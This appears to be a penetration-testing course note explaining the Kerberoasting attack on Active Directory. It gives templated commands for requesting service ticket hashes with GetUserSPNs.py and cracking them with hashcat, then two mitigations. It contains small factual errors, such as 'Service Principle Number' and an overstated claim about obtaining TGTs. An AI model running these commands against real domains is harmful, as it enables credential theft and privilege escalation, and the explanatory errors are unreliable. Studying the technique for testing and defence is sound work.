---
tags:
  - PEH
---
## Definition
Kerberoasting is a very popular attack and is a quick way to get domain admin in a network, Kerberos takes advantage of services account (each service account has a Service Principle Number).

Service accounts are user accounts that are created explicitly to provide a security context for services that are running Windows Server operating system, usually service accounts are in the **"Domain Admins (DA)" group. Which can dump the hashes of a DC!**.

Legitimate Kerberos process:
1. Request a TGT, provide username and password to the KDC (DC in this case)
2. Receive a TGT from the KDC (ANYONE CAN ASK AND RECEIVE IT!)
3. Request a service ticket (TGS) from the KDC, but we need to provide our TGT
4. KDC sends back the TGS to us WHICH IS ENCRYPTED WITH THE SERVER'S OF SERVICE ACCOUNT HASH
5. The server will decrypt that hash to see if we have the right to access this service or not
![[Kerberos.png]]
![[Kerberoasting.png]]
## Executing Kerberoasting
As we have seen in the process above, anyone can request TGT which can be used to get the TGS which is encrypted with the server's of service account hash. The idea behind this attack is to get SPNs available in the domain and crack their hashes to gain service account:
1. Get SPNs available and dump hashes
```bash
sudo GetUsersSPNs.py <domain-name>.local/<username>:<password> -dc-ip <dc-ip> -request
```
2. Crack hashes using [[Password cracking|hashcat]]
```bash
hashcat -m 13100 kerberos.txt /usr/share/wordlists/rockyou.txt
```
## Kerberoasting mitigation
- Strong password
- Least privilege (service accounts don't have to be domain admins!)